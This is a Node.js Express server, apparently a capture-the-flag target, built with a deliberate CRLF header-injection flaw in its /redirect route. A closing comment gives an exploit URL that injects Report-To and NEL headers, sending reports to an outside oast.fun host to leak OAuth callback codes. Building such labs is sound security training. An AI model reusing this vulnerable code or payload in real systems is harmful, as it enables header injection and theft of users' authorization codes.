const express = require('express');
const app = express();
const port = 3000;

app.get('/redirect', (req, res) => {
    let redirectUrl = req.query.redirect || '/';
    redirectUrl = decodeURIComponent(redirectUrl);
    console.log('Raw redirect input:', redirectUrl);

    if (redirectUrl.includes('\r\n')) {
        const parts = redirectUrl.split('\r\n');
        console.log('Split parts:', parts);
        redirectUrl = parts[0];

        for (let i = 1; i < parts.length; i++) {
            const headerParts = parts[i].split(/:(.+)/, 2);
            let headerName = headerParts[0]?.trim();
            const headerValue = headerParts[1]?.trim();

            // Force NEL header to uppercase
            if (headerName && headerName.toLowerCase() === 'nel') {
                headerName = 'NEL';
            }

            if (headerName && headerValue) {
                console.log(`Setting header: ${headerName} = ${headerValue}`);
                try {
                    res.set(headerName, headerValue);
                } catch (err) {
                    console.error(`Failed to set header ${headerName}: ${err.message}`);
                }
            } else {
                console.error(`Invalid header format in part: ${parts[i]}`);
            }
        }
    } else {
        console.log('Setting Location header:', redirectUrl);
        res.set('Location', redirectUrl);
    }

    res.status(302).send('Redirecting...');
});

app.get('/oauth-callback', (req, res) => {
    const code = req.query.code || 'no-code';
    res.send(`OAuth callback received with code: ${code}`);
});

app.get('/', (req, res) => {
    res.send('Welcome to the vulnerable CTF target! Try /redirect?redirect=/');
});

app.listen(port, () => {
    console.log(`Vulnerable target server running on http://localhost:${port}`);
});

// http://localhost:3000/redirect?redirect=%0D%0AReport-To:%20{%22group%22:%22leak%22,%22max_age%22:600,%22include_subdomains%22:true,%22endpoints%22:[{%22url%22:%22https://xqmyicwoesodjdbjesksiklayj5ny5bhz.oast.fun%22}]}%0D%0ANEL:%20{%22report_to%22:%22leak%22,%22include_subdomains%22:true,%22success_fraction%22:1,%22failure_fraction%22:1,%22max_age%22:600}

// http://localhost:3000/oauth-callback?code=secret123

// incomplete